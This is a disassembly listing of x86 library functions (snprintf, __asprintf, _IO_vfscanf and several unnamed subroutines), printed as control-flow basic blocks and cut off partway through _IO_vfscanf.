0xb0461e3:	movzx	eax, byte ptr [ebp - 0x468]
0xb0461ea:	sub	eax, 0x20
0xb0461ed:	cmp	al, 0x5a
0xb0461ef:	ja	0xb0462b0
None
|
|
|
v
0xb048816:	jmp	0xb043938
None
|
|
|
v
0xb04881b:	lea	eax, dword ptr [edx]
0xb04881d:	call	0xb0f9460
None
|
|
|
v
0xb045df4:	cmp	eax, 0x400
0xb045df9:	je	0xb045e40
None
|
|
|
v
0xb046d0b:	lea	eax, dword ptr [ebx - 0x4a6f8]
0xb046d11:	mov	dword ptr [esp + 0xc], eax
0xb046d15:	mov	dword ptr [esp + 8], 0x67c
0xb046d1d:	jmp	0xb046cf3
None
|
|
|
v
0xb045ebb:	mov	eax, dword ptr [ebp - 0x468]
0xb045ec1:	fldz	
0xb045ec3:	fstp	xword ptr [eax]
0xb045ec5:	jmp	0xb045e20
None
|
|
|
v
0xb045d80:	cmp	eax, 3
0xb045d83:	jge	0xb045e40
None
|
|
|
v
0xb0439f7:	mov	eax, dword ptr [esi]
0xb0439f9:	jmp	0xb0438a6
None
|
|
|
v
0xb0439e5:	lea	esp, dword ptr [ebp - 0xc]
0xb0439e8:	pop	ebx
0xb0439e9:	pop	esi
0xb0439ea:	pop	edi
0xb0439eb:	pop	ebp
0xb0439ec:	ret	
None
|
|
|
v
0xb04852f:	mov	edx, dword ptr [ebp - 0x478]
0xb048535:	mov	ecx, dword ptr [ebp - 0x4cc]
0xb04853b:	jmp	0xb045e20
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0485f0
TOTAL BLOCKS :37
0xb0485f0:	push	ebp
0xb0485f1:	push	edi
0xb0485f2:	push	esi
0xb0485f3:	mov	esi, eax
0xb0485f5:	push	ebx
0xb0485f6:	sub	esp, 0x20ec
0xb0485fc:	call	0xb1267db
None
|
|
|
v
0xb0486ee:	mov	eax, dword ptr [esi + 0x48]
0xb0486f1:	mov	ecx, dword ptr [esp + 0x18]
0xb0486f5:	mov	edx, dword ptr [esi + 0x48]
0xb0486f8:	mov	dword ptr [eax + 8], ecx
0xb0486fb:	add	dword ptr [edx + 4], 1
0xb0486ff:	mov	eax, dword ptr [esp + 0x48]
0xb048703:	mov	edx, dword ptr [esp + 0x4c]
0xb048707:	sub	edx, eax
0xb048709:	test	edx, edx
0xb04870b:	jle	0xb048738
None
|
|
|
v
0xb0487a9:	jmp	0xb048768
None
|
|
|
v
0xb048764:	test	ebp, ebp
0xb048766:	jne	0xb048788
None
|
|
|
v
0xb04875a:	lock sub	dword ptr [edx], 1
None
|
|
|
v
0xb04883a:	jmp	0xb048764
None
|
|
|
v
0xb048738:	test	dword ptr [esi], 0x8000
0xb04873e:	jne	0xb048764
None
|
|
|
v
0xb0486b9:	mov	eax, dword ptr [esi]
0xb0486bb:	and	eax, 0x8000
0xb0486c0:	jne	0xb0486ff
None
|
|
|
v
0xb04875e:	jne	0xb048833
None
|
|
|
v
0xb04862f:	lea	eax, dword ptr [esp + 0xe0]
0xb048636:	mov	dword ptr [esp + 0x4c], eax
0xb04863a:	mov	dword ptr [esp + 0x48], eax
0xb04863e:	lea	eax, dword ptr [esp + 0x20e0]
0xb048645:	mov	dword ptr [esp + 0x50], eax
0xb048649:	mov	eax, dword ptr [esi + 0x3c]
0xb04864c:	mov	dword ptr [esp + 8], ecx
0xb048650:	mov	dword ptr [esp + 4], edx
0xb048654:	mov	dword ptr [esp + 0xd0], esi
0xb04865b:	mov	dword ptr [esp + 0x74], eax
0xb04865f:	lea	eax, dword ptr [ebx - 0xb80]
0xb048665:	mov	dword ptr [esp + 0xcc], eax
0xb04866c:	lea	eax, dword ptr [esp + 0x38]
0xb048670:	mov	dword ptr [esp], eax
0xb048673:	mov	dword ptr [esp + 0xa0], 0xffffffff
0xb04867e:	mov	dword ptr [esp + 0x38], 0xfbad8004
0xb048686:	mov	byte ptr [esp + 0x7e], 0
0xb04868b:	mov	dword ptr [esp + 0x80], 0
0xb048696:	call	0xb043810
None
|
|
|
v
0xb0486e4:	lock cmpxchg	dword ptr [edx], ecx
0xb0486e8:	jne	0xb048827
None
|
|
|
v
0xb048626:	cmp	eax, 0xff
0xb048629:	jne	0xb0487e0
None
|
|
|
v
0xb0487d7:	jmp	0xb0486b9
None
|
|
|
v
0xb0487ea:	mov	dword ptr [esp + 4], 0xffffffff
0xb0487f2:	mov	dword ptr [esp], esi
0xb0487f5:	mov	dword ptr [esp + 0x1c], ecx
0xb0487f9:	mov	dword ptr [esp + 0x18], edx
0xb0487fd:	call	0xb066ae0
None
|
|
|
v
0xb048827:	lea	ecx, dword ptr [edx]
0xb048829:	call	0xb0f9430
None
|
|
|
v
0xb04869b:	mov	ebp, dword ptr [ebx + 0x38d8]
0xb0486a1:	test	ebp, ebp
0xb0486a3:	mov	edi, eax
0xb0486a5:	jne	0xb0487b0
None
|
|
|
v
0xb0486ab:	mov	eax, dword ptr [ebx - 0x60]
0xb0486b1:	mov	dword ptr [esp + 0x2c], esi
0xb0486b5:	mov	dword ptr [esp + 0x28], eax
0xb0486b9:	mov	eax, dword ptr [esi]
0xb0486bb:	and	eax, 0x8000
0xb0486c0:	jne	0xb0486ff
None
|
|
|
v
0xb048802:	mov	ecx, dword ptr [esp + 0x1c]
0xb048806:	mov	edx, dword ptr [esp + 0x18]
0xb04880a:	jmp	0xb048626
None
|
|
|
v
0xb04870d:	movsx	ecx, byte ptr [esi + 0x46]
0xb048711:	mov	dword ptr [esp + 0x18], edx
0xb048715:	mov	ecx, dword ptr [esi + ecx + 0x94]
0xb04871c:	mov	dword ptr [esp + 8], edx
0xb048720:	mov	dword ptr [esp + 4], eax
0xb048724:	mov	dword ptr [esp], esi
0xb048727:	call	dword ptr [ecx + 0x1c]
None
|
|
|
v
0xb048833:	lea	eax, dword ptr [edx]
0xb048835:	call	0xb0f9460
None
|
|
|
v
0xb048740:	mov	edx, dword ptr [esi + 0x48]
0xb048743:	sub	dword ptr [edx + 4], 1
0xb048747:	jne	0xb048764
None
|
|
|
v
0xb0486fb:	add	dword ptr [edx + 4], 1
0xb0486ff:	mov	eax, dword ptr [esp + 0x48]
0xb048703:	mov	edx, dword ptr [esp + 0x4c]
0xb048707:	sub	edx, eax
0xb048709:	test	edx, edx
0xb04870b:	jle	0xb048738
None
|
|
|
v
0xb048749:	mov	dword ptr [edx + 8], 0
0xb048750:	cmp	dword ptr gs:[0xc], 0
0xb048758:	je	0xb04875b
None
|
|
|
v
0xb04882e:	jmp	0xb0486ee
None
|
|
|
v
0xb048788:	lea	edx, dword ptr [esp + 0x28]
0xb04878c:	mov	eax, dword ptr [ebx + 0x38bc]
0xb048792:	mov	dword ptr [esp + 4], 0
0xb04879a:	ror	eax, 9
0xb04879d:	xor	eax, dword ptr gs:[0x18]
0xb0487a4:	mov	dword ptr [esp], edx
0xb0487a7:	call	eax
None
|
|
|
v
0xb048768:	mov	eax, edi
0xb04876a:	add	esp, 0x20ec
0xb048770:	pop	ebx
0xb048771:	pop	esi
0xb048772:	pop	edi
0xb048773:	pop	ebp
0xb048774:	ret	
None
|
|
|
v
0xb0486ff:	mov	eax, dword ptr [esp + 0x48]
0xb048703:	mov	edx, dword ptr [esp + 0x4c]
0xb048707:	sub	edx, eax
0xb048709:	test	edx, edx
0xb04870b:	jle	0xb048738
None
|
|
|
v
0xb0486d5:	mov	ecx, 1
0xb0486da:	cmp	dword ptr gs:[0xc], 0
0xb0486e2:	je	0xb0486e5
None
|
|
|
v
0xb048778:	mov	dword ptr [esi + 0x68], 0xffffffff
0xb04877f:	jmp	0xb04862f
None
|
|
|
v
0xb04876a:	add	esp, 0x20ec
0xb048770:	pop	ebx
0xb048771:	pop	esi
0xb048772:	pop	edi
0xb048773:	pop	ebp
0xb048774:	ret	
None
|
|
|
v
0xb04872a:	mov	edx, dword ptr [esp + 0x18]
0xb04872e:	cmp	eax, edx
0xb048730:	mov	eax, 0xffffffff
0xb048735:	cmovne	edi, eax
0xb048738:	test	dword ptr [esi], 0x8000
0xb04873e:	jne	0xb048764
None
|
|
|
v
0xb0487b0:	mov	edx, dword ptr [ebx - 0x60]
0xb0487b6:	mov	eax, dword ptr [ebx + 0x38b8]
0xb0487bc:	mov	dword ptr [esp + 8], esi
0xb0487c0:	ror	eax, 9
0xb0487c3:	xor	eax, dword ptr gs:[0x18]
0xb0487ca:	mov	dword ptr [esp + 4], edx
0xb0487ce:	lea	edx, dword ptr [esp + 0x28]
0xb0487d2:	mov	dword ptr [esp], edx
0xb0487d5:	call	eax
None
|
|
|
v
0xb0486c2:	mov	edx, dword ptr [esi + 0x48]
0xb0486c5:	mov	ecx, dword ptr gs:[8]
0xb0486cc:	mov	dword ptr [esp + 0x18], ecx
0xb0486d0:	cmp	ecx, dword ptr [edx + 8]
0xb0486d3:	je	0xb0486fb
None
|
|
|
v
0xb048601:	add	ebx, 0x1629ff
0xb048607:	cmp	byte ptr [eax + 0x46], 0
0xb04860b:	jne	0xb04862f
None
|
|
|
v
0xb04860d:	mov	eax, dword ptr [ebx - 0xf8]
0xb048613:	test	eax, eax
0xb048615:	je	0xb0487ea
None
|
|
|
v
0xb0487e0:	mov	eax, 0xffffffff
0xb0487e5:	jmp	0xb04876a
None
|
|
|
v
0xb04861b:	mov	eax, dword ptr [esi + 0x68]
0xb04861e:	test	eax, eax
0xb048620:	je	0xb048778
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b04c8b0
TOTAL BLOCKS :20
0xb04c93f:	mov	edx, dword ptr [edx]
0xb04c941:	test	edx, edx
0xb04c943:	jne	0xb04c960
None
|
|
|
v
0xb04c8b0:	push	ebp
0xb04c8b1:	push	edi
0xb04c8b2:	push	esi
0xb04c8b3:	push	ebx
0xb04c8b4:	sub	esp, 0x15
0xb04c8b7:	mov	eax, dword ptr [esp + 0x29]
0xb04c8bb:	call	0xb1267db
None
|
|
|
v
0xb04c973:	mov	eax, dword ptr [esp + 0x2d]
0xb04c977:	or	word ptr [eax + 0xe], di
0xb04c97b:	mov	eax, dword ptr [esp + 0x29]
0xb04c97f:	mov	edi, dword ptr [esp + 0x11]
0xb04c983:	mov	dword ptr [eax], edi
0xb04c985:	xor	eax, eax
0xb04c987:	add	esp, 0x15
0xb04c98a:	pop	ebx
0xb04c98b:	pop	esi
0xb04c98c:	pop	edi
0xb04c98d:	pop	ebp
0xb04c98e:	ret	
None
|
|
|
v
0xb04c92e:	cmp	esi, ecx
0xb04c930:	jne	0xb04c960
None
|
|
|
v
0xb04c911:	mov	eax, dword ptr [edi + 8]
0xb04c914:	test	eax, eax
0xb04c916:	je	0xb04c993
None
|
|
|
v
0xb04c918:	cmp	eax, dword ptr [esp + 1]
0xb04c91c:	jne	0xb04c960
None
|
|
|
v
0xb04c945:	mov	edx, eax
0xb04c947:	sub	edx, dword ptr [esp + 9]
0xb04c94b:	cmp	edx, dword ptr [esp + 5]
0xb04c94f:	jle	0xb04c960
None
|
|
|
v
0xb04c960:	mov	edi, dword ptr [edi]
0xb04c962:	test	edi, edi
0xb04c964:	jne	0xb04c908
None
|
|
|
v
0xb04c993:	mov	eax, ebp
0xb04c995:	jmp	0xb04c945
None
|
|
|
v
0xb04c932:	add	eax, 1
0xb04c935:	movzx	ecx, byte ptr [eax]
0xb04c938:	add	edx, 4
0xb04c93b:	test	cl, cl
0xb04c93d:	jne	0xb04c928
None
|
|
|
v
0xb04c908:	cmp	byte ptr [esp], 0
0xb04c90c:	lea	edx, dword ptr [edi + 8]
0xb04c90f:	je	0xb04c98f
None
|
|
|
v
0xb04c98f:	mov	eax, ebp
0xb04c991:	jmp	0xb04c93f
None
|
|
|
v
0xb04c951:	mov	esi, dword ptr [edi + 4]
0xb04c954:	mov	dword ptr [esp + 0x11], eax
0xb04c958:	mov	dword ptr [esp + 5], edx
0xb04c95c:	mov	dword ptr [esp + 0xd], esi
0xb04c960:	mov	edi, dword ptr [edi]
0xb04c962:	test	edi, edi
0xb04c964:	jne	0xb04c908
None
|
|
|
v
0xb04c966:	mov	edi, dword ptr [esp + 0xd]
0xb04c96a:	mov	eax, 1
0xb04c96f:	test	edi, edi
0xb04c971:	je	0xb04c987
None
|
|
|
v
0xb04c928:	mov	esi, dword ptr [edx]
0xb04c92a:	test	esi, esi
0xb04c92c:	je	0xb04c945
None
|
|
|
v
0xb04c8e2:	movzx	eax, byte ptr [esi + 1]
0xb04c8e6:	lea	ebp, dword ptr [esi + 1]
0xb04c8e9:	mov	dword ptr [esp + 0x11], 0
0xb04c8f1:	mov	dword ptr [esp + 5], 0
0xb04c8f9:	mov	dword ptr [esp + 0xd], 0
0xb04c901:	mov	byte ptr [esp], al
0xb04c904:	mov	dword ptr [esp + 1], eax
0xb04c908:	cmp	byte ptr [esp], 0
0xb04c90c:	lea	edx, dword ptr [edi + 8]
0xb04c90f:	je	0xb04c98f
None
|
|
|
v
0xb04c91e:	mov	eax, ebp
0xb04c920:	jmp	0xb04c932
None
|
|
|
v
0xb04c997:	add	esp, 0x15
0xb04c99a:	mov	eax, 1
0xb04c99f:	pop	ebx
0xb04c9a0:	pop	esi
0xb04c9a1:	pop	edi
0xb04c9a2:	pop	ebp
0xb04c9a3:	ret	
None
|
|
|
v
0xb04c987:	add	esp, 0x15
0xb04c98a:	pop	ebx
0xb04c98b:	pop	esi
0xb04c98c:	pop	edi
0xb04c98d:	pop	ebp
0xb04c98e:	ret	
None
|
|
|
v
0xb04c8c0:	add	ebx, 0x15e740
0xb04c8c6:	mov	eax, dword ptr [eax]
0xb04c8c8:	movzx	edx, byte ptr [eax]
0xb04c8cb:	mov	esi, eax
0xb04c8cd:	mov	dword ptr [esp + 9], eax
0xb04c8d1:	mov	eax, dword ptr [ebx + 0x376c]
0xb04c8d7:	mov	edi, dword ptr [eax + edx*4]
0xb04c8da:	test	edi, edi
0xb04c8dc:	je	0xb04c997
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b04c9b0
TOTAL BLOCKS :20
0xb04c9c0:	add	ebx, 0x15e640
0xb04c9c6:	mov	eax, dword ptr [eax]
0xb04c9c8:	mov	edx, dword ptr [eax]
0xb04c9ca:	mov	esi, eax
0xb04c9cc:	mov	dword ptr [esp + 8], eax
0xb04c9d0:	mov	eax, dword ptr [ebx + 0x376c]
0xb04c9d6:	mov	edi, dword ptr [eax + edx*4]
0xb04c9d9:	test	edi, edi
0xb04c9db:	je	0xb04ca93
None
|
|
|
v
0xb04ca26:	cmp	ecx, esi
0xb04ca28:	jne	0xb04ca5a
None
|
|
|
v
0xb04c9b0:	push	ebp
0xb04c9b1:	push	edi
0xb04c9b2:	push	esi
0xb04c9b3:	push	ebx
0xb04c9b4:	sub	esp, 0x14
0xb04c9b7:	mov	eax, dword ptr [esp + 0x28]
0xb04c9bb:	call	0xb1267db
None
|
|
|
v
0xb04ca2a:	add	eax, 4
0xb04ca2d:	mov	ecx, dword ptr [eax]
0xb04ca2f:	add	edx, 4
0xb04ca32:	test	ecx, ecx
0xb04ca34:	jne	0xb04ca20
None
|
|
|
v
0xb04ca8e:	mov	eax, dword ptr [esp]
0xb04ca91:	jmp	0xb04ca3c
None
|
|
|
v
0xb04ca6d:	mov	eax, dword ptr [esp + 0x2c]
0xb04ca71:	or	word ptr [eax + 0xe], di
0xb04ca75:	mov	eax, dword ptr [esp + 0x28]
0xb04ca79:	mov	edi, dword ptr [esp + 0x10]
0xb04ca7d:	mov	dword ptr [eax], edi
0xb04ca7f:	xor	eax, eax
0xb04ca81:	add	esp, 0x14
0xb04ca84:	pop	ebx
0xb04ca85:	pop	esi
0xb04ca86:	pop	edi
0xb04ca87:	pop	ebp
0xb04ca88:	ret	
None
|
|
|
v
0xb04ca20:	mov	esi, dword ptr [edx]
0xb04ca22:	test	esi, esi
0xb04ca24:	je	0xb04ca3c
None
|
|
|
v
0xb04ca60:	mov	edi, dword ptr [esp + 0xc]
0xb04ca64:	mov	eax, 1
0xb04ca69:	test	edi, edi
0xb04ca6b:	je	0xb04ca81
None
|
|
|
v
0xb04ca36:	mov	edx, dword ptr [edx]
0xb04ca38:	test	edx, edx
0xb04ca3a:	jne	0xb04ca5a
None
|
|
|
v
0xb04c9e1:	mov	ebp, dword ptr [esi + 4]
0xb04c9e4:	lea	edx, dword ptr [esi + 4]
0xb04c9e7:	mov	dword ptr [esp], edx
0xb04c9ea:	mov	dword ptr [esp + 0x10], 0
0xb04c9f2:	mov	dword ptr [esp + 4], 0
0xb04c9fa:	mov	dword ptr [esp + 0xc], 0
0xb04ca02:	lea	esi, dword ptr [esi]
0xb04ca08:	test	ebp, ebp
0xb04ca0a:	lea	edx, dword ptr [edi + 8]
0xb04ca0d:	je	0xb04ca89
None
|
|
|
v
0xb04ca1a:	mov	eax, dword ptr [esp]
0xb04ca1d:	jmp	0xb04ca2a
None
|
|
|
v
0xb04ca4b:	mov	esi, dword ptr [edi + 4]
0xb04ca4e:	mov	dword ptr [esp + 0x10], eax
0xb04ca52:	mov	dword ptr [esp + 4], edx
0xb04ca56:	mov	dword ptr [esp + 0xc], esi
0xb04ca5a:	mov	edi, dword ptr [edi]
0xb04ca5c:	test	edi, edi
0xb04ca5e:	jne	0xb04ca08
None
|
|
|
v
0xb04ca16:	cmp	eax, ebp
0xb04ca18:	jne	0xb04ca5a
None
|
|
|
v
0xb04ca3c:	mov	edx, eax
0xb04ca3e:	sub	edx, dword ptr [esp + 8]
0xb04ca42:	sar	edx, 2
0xb04ca45:	cmp	edx, dword ptr [esp + 4]
0xb04ca49:	jle	0xb04ca5a
None
|
|
|
v
0xb04ca81:	add	esp, 0x14
0xb04ca84:	pop	ebx
0xb04ca85:	pop	esi
0xb04ca86:	pop	edi
0xb04ca87:	pop	ebp
0xb04ca88:	ret	
None
|
|
|
v
0xb04ca0f:	mov	eax, dword ptr [edi + 8]
0xb04ca12:	test	eax, eax
0xb04ca14:	je	0xb04ca8e
None
|
|
|
v
0xb04ca08:	test	ebp, ebp
0xb04ca0a:	lea	edx, dword ptr [edi + 8]
0xb04ca0d:	je	0xb04ca89
None
|
|
|
v
0xb04ca93:	add	esp, 0x14
0xb04ca96:	mov	eax, 1
0xb04ca9b:	pop	ebx
0xb04ca9c:	pop	esi
0xb04ca9d:	pop	edi
0xb04ca9e:	pop	ebp
0xb04ca9f:	ret	
None
|
|
|
v
0xb04ca89:	mov	eax, dword ptr [esp]
0xb04ca8c:	jmp	0xb04ca36
None
|
|
|
v
0xb04ca5a:	mov	edi, dword ptr [edi]
0xb04ca5c:	test	edi, edi
0xb04ca5e:	jne	0xb04ca08
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:snprintf
TOTAL BLOCKS :3
0xb04d465:	add	ebx, 0x15db9b
0xb04d46b:	mov	dword ptr [esp + 8], eax
0xb04d46f:	mov	eax, dword ptr [esp + 0x24]
0xb04d473:	mov	dword ptr [esp + 4], eax
0xb04d477:	mov	eax, dword ptr [esp + 0x20]
0xb04d47b:	mov	dword ptr [esp], eax
0xb04d47e:	call	0xb067ef0
None
|
|
|
v
0xb04d450:	push	ebx
0xb04d451:	sub	esp, 0x18
0xb04d454:	lea	eax, dword ptr [esp + 0x2c]
0xb04d458:	mov	dword ptr [esp + 0xc], eax
0xb04d45c:	mov	eax, dword ptr [esp + 0x28]
0xb04d460:	call	0xb1267db
None
|
|
|
v
0xb04d483:	add	esp, 0x18
0xb04d486:	pop	ebx
0xb04d487:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__asprintf
TOTAL BLOCKS :3
0xb04d4d5:	add	ebx, 0x15db2b
0xb04d4db:	mov	dword ptr [esp + 4], eax
0xb04d4df:	mov	eax, dword ptr [esp + 0x20]
0xb04d4e3:	mov	dword ptr [esp], eax
0xb04d4e6:	call	0xb067b80
None
|
|
|
v
0xb04d4c0:	push	ebx
0xb04d4c1:	sub	esp, 0x18
0xb04d4c4:	lea	eax, dword ptr [esp + 0x28]
0xb04d4c8:	mov	dword ptr [esp + 8], eax
0xb04d4cc:	mov	eax, dword ptr [esp + 0x24]
0xb04d4d0:	call	0xb1267db
None
|
|
|
v
0xb04d4eb:	add	esp, 0x18
0xb04d4ee:	pop	ebx
0xb04d4ef:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_IO_vfscanf
TOTAL BLOCKS :332
0xb04d6f0:	mov	eax, dword ptr [ebp - 0x154]
0xb04d6f6:	add	dword ptr [ebp - 0x158], 1
0xb04d6fd:	test	eax, eax
0xb04d6ff:	je	0xb04d759
None
|
|
|
v
0xb0500e7:	mov	eax, dword ptr [ebp - 0x194]
0xb0500ed:	mov	edx, ecx
0xb0500ef:	mov	eax, dword ptr [eax]
0xb0500f1:	sub	edx, eax
0xb0500f3:	cmp	edx, dword ptr [ebp - 0x19c]
0xb0500f9:	je	0xb05011f
None
|
|
|
v
0xb04fff9:	lea	edx, dword ptr [eax + 1]
0xb04fffc:	mov	dword ptr [esi + 4], edx
0xb04ffff:	movzx	eax, byte ptr [eax]
0xb050002:	mov	dword ptr [ebp - 0x14c], eax
0xb050008:	mov	eax, dword ptr [ebp - 0x158]
0xb05000e:	mov	ecx, dword ptr [ebp - 0x160]
0xb050014:	mov	edx, dword ptr [ebp - 0x14c]
0xb05001a:	lea	edi, dword ptr [eax + 1]
0xb05001d:	movzx	eax, byte ptr [ebp - 0x154]
0xb050024:	cmp	byte ptr [ecx + edx], al
0xb050027:	je	0xb0500a0
None
|
|
|
v
0xb04d698:	test	al, 0x80
0xb04d69a:	jne	0xb04d810
None
|
|
|
v
0xb055138:	lea	eax, dword ptr [edx]
0xb05513a:	call	0xb0f9460
None
|
|
|
v
0xb052ce5:	mov	dword ptr [ebp - 0x14c], eax
0xb052ceb:	mov	ecx, dword ptr [ebx - 0xdc]
0xb052cf1:	mov	eax, dword ptr [ebp - 0x170]
0xb052cf7:	mov	edi, dword ptr [ebp - 0x16c]
0xb052cfd:	mov	eax, dword ptr [eax + ecx]
0xb052d00:	mov	dword ptr [ebp - 0x174], eax
0xb052d06:	jmp	0xb04fef8
None
|
|
|
v
0xb051e72:	jmp	0xb04d800
None
|
|
|
v
0xb050223:	mov	esi, dword ptr [ebp + 8]
0xb050226:	mov	edi, 2
0xb05022b:	jmp	0xb04db90
None
|
|
|
v
0xb04f189:	mov	edx, dword ptr [ebp - 0x178]
0xb04f18f:	mov	eax, esi
0xb04f191:	movzx	ecx, al
0xb04f194:	add	eax, 1
0xb04f197:	mov	byte ptr [edi + ecx], 1
0xb04f19b:	cmp	byte ptr [edx], al
0xb04f19d:	ja	0xb04f191
None
|
|
|
v
0xb04f044:	mov	eax, dword ptr [ebp - 0x190]
0xb04f04a:	test	eax, eax
0xb04f04c:	jne	0xb053222
None
|
|
|
v
0xb04fdda:	add	dword ptr [ebp - 0x16c], 1
0xb04fde1:	jmp	0xb04fd93
None
|
|
|
v
0xb0501e0:	mov	edx, dword ptr [ebp - 0x194]
0xb0501e6:	mov	ecx, dword ptr [ebp - 0x14c]
0xb0501ec:	mov	dword ptr [ebp - 0x14c], esi
0xb0501f2:	mov	esi, dword ptr [ebp + 8]
0xb0501f5:	mov	dword ptr [edx], eax
0xb0501f7:	add	eax, dword ptr [ebp - 0x19c]
0xb0501fd:	mov	dword ptr [ebp - 0x1a4], eax
0xb050203:	mov	eax, dword ptr [ebp - 0x14c]
0xb050209:	mov	dword ptr [ebp - 0x19c], eax
0xb05020f:	jmp	0xb05005b
None
|
|
|
v
0xb050fe0:	xor	edi, edi
0xb050fe2:	mov	dword ptr [ebp - 0x188], 0xffffffff
0xb050fec:	jmp	0xb04db90
None
|
|
|
v
0xb052aca:	movzx	eax, byte ptr [ebp - 0x14c]
0xb052ad1:	mov	edi, 2
0xb052ad6:	mov	dword ptr [esp], esi
0xb052ad9:	mov	dword ptr [esp + 4], eax
0xb052add:	call	0xb071270
None
|
|
|
v
0xb04d780:	mov	eax, dword ptr [ebp - 0x154]
0xb04d786:	xor	edi, edi
0xb04d788:	test	eax, eax
0xb04d78a:	je	0xb04db90
None
|
|
|
v
0xb04d800:	mov	eax, 0xffffffff
0xb04d805:	jmp	0xb04dbe4
None
|
|
|
v
0xb04dd70:	mov	edx, dword ptr [esi + 0x48]
0xb04dd73:	mov	edi, dword ptr gs:[8]
0xb04dd7a:	cmp	edi, dword ptr [edx + 8]
0xb04dd7d:	je	0xb04dda1
None
|
|
|
v
0xb04db50:	mov	dword ptr [ebp - 0x168], esi
0xb04db56:	mov	esi, dword ptr [ebp + 8]
0xb04db59:	jmp	0xb04d91d
None
|
|
|
v
0xb04d846:	mov	eax, dword ptr [esi + 4]
0xb04d849:	cmp	eax, dword ptr [esi + 8]
0xb04d84c:	jae	0xb052b55
None
|
|
|
v
0xb04fd06:	mov	eax, dword ptr [ebp - 0x15c]
0xb04fd0c:	mov	esi, dword ptr [ebp + 8]
0xb04fd0f:	test	eax, eax
0xb04fd11:	je	0xb04ffe0
None
|
|
|
v
0xb04d5ed:	mov	eax, dword ptr [ebp + 0x10]
0xb04d5f0:	mov	edi, dword ptr [ebp + 0xc]
0xb04d5f3:	mov	dword ptr [ebp - 0x144], 0
0xb04d5fd:	mov	dword ptr [ebp - 0x140], 0
0xb04d607:	mov	dword ptr [ebp - 0x198], eax
0xb04d60d:	movzx	eax, byte ptr [edi]
0xb04d610:	mov	byte ptr [ebp - 0x19d], 0
0xb04d617:	mov	dword ptr [ebp - 0x164], 0
0xb04d621:	mov	dword ptr [ebp - 0x160], 0
0xb04d62b:	test	al, al
0xb04d62d:	mov	dword ptr [ebp - 0x154], 0
0xb04d637:	mov	dword ptr [ebp - 0x19c], 0
0xb04d641:	mov	dword ptr [ebp - 0x194], 0
0xb04d64b:	mov	dword ptr [ebp - 0x150], 0
0xb04d655:	mov	dword ptr [ebp - 0x1a4], 0
0xb04d65f:	mov	dword ptr [ebp - 0x1a8], 0
0xb04d669:	mov	dword ptr [ebp - 0x174], 0
0xb04d673:	mov	dword ptr [ebp - 0x14c], 0
0xb04d67d:	mov	dword ptr [ebp - 0x158], 0
0xb04d687:	mov	dword ptr [ebp - 0x188], 0
0xb04d691:	je	0xb04d780
None
|
|
|
v
0xb050c31:	mov	edi, dword ptr [ebp - 0x16c]
0xb050c37:	mov	dword ptr [ebp - 0x14c], edx
0xb050c3d:	jmp	0xb04fef8
None
|
|
|
v
0xb04d7c6:	cmp	eax, 0xff
0xb04d7c9:	jne	0xb04d798
None
|
|
|
v
0xb04db82:	mov	dword ptr [ebp - 0x188], 0xffffffff
0xb04db8c:	lea	esi, dword ptr [esi]
0xb04db90:	test	dword ptr [esi], 0x8000
0xb04db96:	je	0xb04dc32
None
|
|
|
v
0xb04d531:	add	ebx, 0x15dacf
0xb04d537:	sub	esp, 0x1dc
0xb04d53d:	mov	esi, dword ptr [ebp + 8]
0xb04d540:	mov	dword ptr [ebp - 0x170], eax
0xb04d546:	cmp	byte ptr [esi + 0x46], 0
0xb04d54a:	mov	ecx, dword ptr [ebx - 0x134]
0xb04d550:	mov	eax, dword ptr [eax + ecx]
0xb04d553:	mov	dword ptr [ebp - 0x180], eax
0xb04d559:	mov	eax, dword ptr [eax]
0xb04d55b:	mov	dword ptr [ebp - 0x1b8], eax
0xb04d561:	jne	0xb04d583
None
|
|
|
v
0xb04dcf7:	mov	eax, dword ptr [ebp - 0x198]
0xb04dcfd:	mov	ecx, dword ptr [eax]
0xb04dcff:	add	eax, 4
0xb04dd02:	mov	dword ptr [ebp - 0x198], eax
0xb04dd08:	mov	dword ptr [ebp - 0x194], ecx
0xb04dd0e:	mov	eax, dword ptr [ebp - 0x194]
0xb04dd14:	test	eax, eax
0xb04dd16:	je	0xb051121
None
|
|
|
v
0xb04d836:	cmp	dword ptr [ebp - 0x14c], -1
0xb04d83d:	je	0xb04dbf4
None
|
|
|
v
0xb04d933:	lea	ecx, dword ptr [eax - 0x4c]
0xb04d936:	cmp	cl, 0x2e
0xb04d939:	lea	edi, dword ptr [edx + 1]
0xb04d93c:	ja	0xb04de3e
None
|
|
|
v
0xb05004d:	mov	eax, dword ptr [ebp - 0x15c]
0xb050053:	test	eax, eax
0xb050055:	je	0xb050150
None
|
|
|
v
0xb05010d:	mov	ecx, dword ptr [ebp - 0x154]
0xb050113:	test	eax, eax
0xb050115:	je	0xb05011f
None
|
|
|
v
0xb050d5f:	mov	dword ptr [esp], esi
0xb050d62:	mov	dword ptr [ebp - 0x14c], edx
0xb050d68:	call	0xb070a80
None
|
|
|
v
0xb04dbde:	mov	eax, dword ptr [ebp - 0x188]
0xb04dbe4:	lea	esp, dword ptr [ebp - 0xc]
0xb04dbe7:	pop	ebx
0xb04dbe8:	pop	esi
0xb04dbe9:	pop	edi
0xb04dbea:	pop	ebp
0xb04dbeb:	ret	
None
|
|
|
v
0xb04fec8:	mov	dword ptr [ebp - 0x184], 0
0xb04fed2:	jmp	0xb04fdb3
None
|
|
|
v
0xb04f13b:	mov	dword ptr [ebp + 8], esi
0xb04f13e:	jmp	0xb04f150
None
|
|
|
v
0xb050400:	sub	esp, 0x110
0xb050406:	lea	eax, dword ptr [esp + 0x1f]
0xb05040a:	and	eax, 0xfffffff0
0xb05040d:	mov	dword ptr [ebp - 0x160], eax
0xb050413:	mov	dword ptr [ebp - 0x164], 0x100
0xb05041d:	jmp	0xb04f108
None
|
|
|
v
0xb04dcab:	mov	eax, dword ptr [ebp - 0x16c]
0xb04dcb1:	mov	dword ptr [ebp - 0x178], eax
0xb04dcb7:	mov	eax, dword ptr [ebp - 0x17c]
0xb04dcbd:	and	eax, 1
0xb04dcc0:	mov	dword ptr [ebp - 0x15c], eax
